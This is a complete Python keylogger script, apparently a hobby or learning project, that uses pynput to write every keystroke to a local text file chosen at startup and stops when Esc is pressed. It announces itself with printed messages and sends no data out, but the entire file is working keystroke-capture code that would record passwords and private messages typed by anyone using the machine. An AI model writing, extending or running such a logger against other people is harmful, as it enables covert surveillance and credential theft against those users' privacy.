from pynput import keyboard
import time
import os

# Headline message    
print("\n------------------------- ")
print("Simple Keylogger By Sovan Das")
print("-------------------------\n ")



# Function to handle key press
def on_press(key):
    global log_file
    try:
        log_file.write(str(key.char))
        log_file.write('\n')
        log_file.flush()
    except AttributeError:
        if key == keyboard.Key.space:
            log_file.write(' ')
            log_file.write('\n')
            log_file.flush()
        elif key == keyboard.Key.esc:
            global stop
            print("Stopping the keylogger...\n")
            stop = True
        else:
            log_file.write(str(key))
            log_file.write('\n')
            log_file.flush()

# Function to handle key release
def on_release(key):
    pass

# Ask user for log file path
log_file_path = input("Enter the path to save this log file (include '.txt' extension): ")

# Check if file exists, if not create one
if not os.path.exists(log_file_path):
    log_file = open(log_file_path, 'w')
else:
    log_file = open(log_file_path, 'a')

# Start listening for keystrokes
stop = False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("\nKeylogger started. Press 'Esc' to stop.")
    while not stop:
        time.sleep(0.1)

# Close log file
log_file.close()
print("Keylogger stopped.\n")